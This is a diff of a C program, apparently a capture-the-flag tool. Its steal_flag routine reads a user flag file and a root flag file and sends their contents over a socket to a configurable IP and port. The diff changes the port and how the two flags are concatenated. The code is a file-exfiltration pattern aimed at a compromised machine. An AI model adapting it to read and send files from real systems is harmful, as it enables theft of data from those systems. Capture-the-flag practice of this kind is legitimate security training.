@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #define MAX 80
-#define PORT 8888 //change your port
+#define PORT 9999 //change your port
 #define SA struct sockaddr
 
 char IP[]="127.0.0.1"; //change your ip
@@ -16,7 +16,7 @@ char* read_flag(char* flag, char *path) {
 //
 //pointer fixed with this
 //https://www.educative.io/edpresso/resolving-the-function-returns-address-of-local-variable-error
-	
+
 	FILE *fileStream;
 	//char fileText [100]; //just in case it doesnt work, use this instead
 	if(fileStream = fopen (path, "r")){
@@ -41,14 +41,16 @@ void steal_flag(int sockfd)
 		n = 0;
 		//get user flag
 		flag = read_flag(flag,userPath);
-		
+
 		//remove these two lines if you only have on flag
 		rootFlag = read_flag(rootFlag,rootPath);
-		if( flag[strlen(flag)-1] == '\n' )
-			flag[strlen(flag)-1] = '|';
+		//if( flag[strlen(flag)-1] == '\n' )
+		//	flag[strlen(flag)-1] = '|';
+		strcat(flag," | ");
+		strcat(rootFlag,"\n");
 		strcat(flag,rootFlag);
-		
-		
+
+
 		strcpy(buff, flag);
 		//const char* buff = read_buff();
 		sleep(1);
@@ -92,4 +94,3 @@ int main()
 	// close the socket
 	close(sockfd);
 }
-
